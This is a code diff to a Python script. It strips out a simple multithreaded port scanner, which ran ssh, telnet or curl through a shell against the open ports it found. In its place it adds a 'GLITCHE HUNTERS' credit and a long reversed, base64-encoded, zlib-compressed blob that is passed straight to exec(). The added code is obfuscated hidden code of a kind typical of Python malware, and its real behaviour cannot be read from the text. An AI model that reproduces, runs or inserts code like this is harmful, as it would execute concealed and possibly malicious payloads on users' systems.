@@ -1,54 +1,5 @@
-import socket
-import threading
-from concurrent.futures import ThreadPoolExecutor
-import subprocess
-import os
 
-def scan_port(host, port):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(1)
-    result = sock.connect_ex((host, port))
-    sock.close()
-    return port if result == 0 else None
+# Powred by : GLITCHE HUNTERS| GHT
+                    
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
 
-def check_open_ports(host, start_port, end_port):
-    open_ports = []
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = {executor.submit(scan_port, host, port): port for port in range(start_port, end_port + 1)}
-        for future in futures:
-            port = future.result()
-            if port:
-                open_ports.append(port)
-                print(f"Port {port} is open")
-    return open_ports
-
-def attempt_session_on_ports(host, open_ports):
-    for port in open_ports:
-        command = ""
-        if port == 22:
-            command = f"ssh user@{host} -p {port}"  # Replace 'user' with the actual username
-        elif port == 23:
-            command = f"telnet {host} {port}"
-        elif port == 80:
-            command = f"curl http://{host}:{port}"  # Simple HTTP request
-        elif port == 443:
-            command = f"curl https://{host}:{port}"  # Simple HTTPS request
-
-        if command:
-            print(f"Attempting to open session on port {port}...")
-            subprocess.call(command, shell=True)
-
-def main():
-    host = input("Enter the host (e.g., example.com or 192.168.1.1): ").strip()
-    start_port = 1
-    end_port = 1024
-    print("Checking for open ports...")
-    open_ports = check_open_ports(host, start_port, end_port)
-    if open_ports:
-        print("Attempting to open sessions on open ports...")
-        attempt_session_on_ports(host, open_ports)
-    else:
-        print("No open ports found.")
-
-if __name__ == "__main__":
-    main()
